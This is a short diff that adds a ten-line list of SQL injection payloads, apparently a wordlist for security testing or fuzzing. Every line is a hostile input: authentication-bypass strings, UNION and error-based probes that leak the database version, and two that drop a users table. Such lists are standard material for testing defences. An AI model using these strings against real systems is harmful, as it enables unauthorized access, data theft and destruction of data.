@@ -1,0 +1,10 @@
+' OR '1'='1
+' OR 1=1--
+'; DROP TABLE users--
+' UNION SELECT NULL--
+1' AND '1'='1
+' OR '1'='1' /*
+admin'--
+' OR ''='
+1; DROP TABLE users
+' AND 1=CONVERT(int, (SELECT @@version))--
